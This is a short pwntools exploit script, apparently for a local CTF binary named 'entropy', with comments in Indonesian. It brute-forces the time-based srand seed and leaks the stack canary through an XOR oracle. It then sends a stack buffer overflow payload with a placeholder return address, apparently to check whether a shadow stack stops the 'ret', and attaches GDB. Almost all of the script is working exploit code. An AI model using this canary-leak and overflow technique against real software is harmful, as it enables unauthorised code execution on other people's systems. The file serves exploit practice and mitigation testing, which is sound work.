from pwn import *
import ctypes
import time

context.binary = elf = ELF('./entropy')
context.log_level = 'info'

libc = ELF('./libc6_2.42-0ubuntu3_amd64.so', checksec=False) 
libc_rand = ctypes.CDLL(libc.path)

p = process('./entropy')

# 1. Sync Seed & Leak
p.sendline(b'72') 
server_rand = int(p.recvline().strip())

valid_seed = None
now = int(time.time())
for delta in range(-60, 61):
    test_seed = now + delta
    libc_rand.srand(test_seed)
    if (libc_rand.rand() & 0xff) == server_rand:
        valid_seed = test_seed
        break

if valid_seed is None:
    log.failure("Gagal sync seed di lokal, coba jalankan ulang.")
    p.close()
    exit(1)

libc_rand.srand(valid_seed)
libc_rand.rand() 

def leak_byte(offset):
    p.sendline(str(offset).encode())
    line = p.recvline().strip()
    val = int(line)
    r = libc_rand.rand() & 0xff
    return val ^ r

canary = b'\x00' 
for i in range(73, 80):
    canary += p8(leak_byte(i))
canary = u64(canary)

# 2. Payload Dummy
# Kita pakai alamat 0x4141414141414141 sebagai return address.
# Tujuannya: kalau CPU mendeteksi Shadow Stack, program akan crash tepat di instruksi 'ret' (SIGSEGV).
payload = b'A' * 72
payload += p64(canary)
payload += b'B' * 8
payload += p64(0)
payload += p64(0)
payload += p64(0x4141414141414141) # Fake Return Address

log.info("Menunggu GDB ditempel...")
gdb.attach(p, gdbscript='b *main+233\nc')
p.sendline(payload)
p.interactive()
